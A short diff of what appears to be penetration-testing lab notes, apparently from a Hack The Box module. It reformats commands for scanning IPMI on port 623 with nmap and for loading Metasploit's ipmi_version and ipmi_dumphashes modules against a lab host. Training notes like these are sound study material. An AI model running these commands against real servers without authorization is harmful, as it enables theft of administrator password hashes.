@@ -1,15 +1,17 @@
-
-```shell-session
-u@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+[[metasploit]]
+[[nmap]]
+[[hashcat]]
+```bash
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
 ```
 
 
-```shell-session
+```bash
 msf6 > use auxiliary/scanner/ipmi/ipmi_version 
 ```
 
 
-```shell-session
+```bash
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
 ```
 
